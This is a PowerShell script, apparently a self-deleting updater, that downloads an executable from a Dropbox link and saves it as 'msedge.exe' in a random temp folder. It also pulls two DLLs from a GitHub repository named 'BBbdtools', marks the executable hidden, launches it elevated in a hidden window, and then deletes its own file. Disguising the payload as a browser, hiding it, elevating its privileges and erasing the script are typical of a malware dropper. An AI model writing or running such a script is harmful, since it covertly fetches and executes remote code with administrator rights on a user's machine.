#sleep
start-sleep 10

#change directory
cd $env:temp/sVBXKuz

#download new file
Invoke-WebRequest -Uri "dl.dropboxusercontent.com/scl/fi/m3ub7x9td0g1a7b2jlv62/wsappa-1.9.exe?rlkey=rhyarsxdetqvyyx5gfv44uyq7&dl=0" -OutFile msedge_new.exe
Copy-Item -Path .\msedge_new.exe -Destination .\msedge.exe -Force

#delete old file
Remove-Item .\msedge_new.exe
Remove-Item .\wsappa.exe

Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BBbdtools/main/bd/tools/libsodium.dll" -OutFile libsodium.dll
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BBbdtools/main/bd/tools/libopus.dll" -OutFile libopus.dll

#sleep
start-sleep 2


# Set "Hidden" attribute on the file
$filePath = Join-Path $env:temp\sVBXKuz "msedge.exe"
$attr = [System.IO.FileAttributes]::Hidden
[System.IO.File]::SetAttributes($filePath, $attr)

#start new file
Start-Process -FilePath "$env:temp/sVBXKuz/msedge.exe" -Verb RunAs -WindowStyle Hidden



#sleep
start-sleep 2

#clean uo
powershell.exe /c Remove-Item $env:temp/sVBXKuz/updater.ps1
